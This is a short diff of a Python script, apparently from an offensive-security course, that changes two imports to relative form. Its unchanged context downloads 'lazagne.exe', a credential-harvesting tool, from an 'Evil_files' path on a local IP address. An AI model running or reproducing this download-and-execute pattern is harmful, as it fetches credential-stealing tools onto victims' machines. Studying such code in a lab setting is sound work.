@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
-from Download_file import download
-from Udemy.Execute_command import execute_command
+from ..Download_file import download
+from ..Execute_command import execute_command
 import subprocess
 
 download.download("http://10.0.2.15/Evil_files/lazagne.exe")
